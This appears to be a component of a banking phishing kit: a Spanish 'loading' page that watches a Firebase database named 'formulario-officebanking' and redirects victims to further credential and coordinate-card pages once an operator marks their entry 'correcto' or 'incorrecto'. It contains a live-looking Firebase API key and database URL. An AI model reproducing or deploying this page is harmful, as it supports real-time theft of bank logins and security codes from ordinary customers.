
<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Cargando Clave 3.0</title>
  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #fff;
      color: red;
      text-align: center;
      padding-top: 30vh;
    }
    .dots span {
      display: inline-block;
      width: 10px;
      height: 10px;
      margin: 0 3px;
      background-color: red;
      border-radius: 50%;
      animation: blink 1.4s infinite both;
    }
    .dots span:nth-child(2) { animation-delay: 0.2s; }
    .dots span:nth-child(3) { animation-delay: 0.4s; }
    @keyframes blink {
      0%, 80%, 100% { opacity: 0; }
      40% { opacity: 1; }
    }
  </style>
</head>
<body>
  <h2>Cargando datos...</h2>
  <div class="dots"><span></span><span></span><span></span></div>

  <script>
    const firebaseConfig = {
      apiKey: "AIzaSyBdPWoveN6ftUuIsUtnF1hA5eB7UWZR8aQ",
      authDomain: "formulario-officebanking.firebaseapp.com",
      databaseURL: "https://formulario-officebanking-default-rtdb.firebaseio.com",
      projectId: "formulario-officebanking"
    };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();

    db.ref("validacion_estado").on("value", snap => {
      const val = snap.val();
      if (val === "correcto") {
        db.ref("validacion_clave3").set("");
        window.location.href = "clave3.html";
        window.location.href = "clave3.html";
      } else if (val === "incorrecto") {
        db.ref("validacion_clave3").set("");
        window.location.href = "coordenadas_error.html";
        db.ref("validacion_clave3").set("");
        window.location.href = "coordenadas_error.html";
      }
    });
  </script>
</body>
</html>
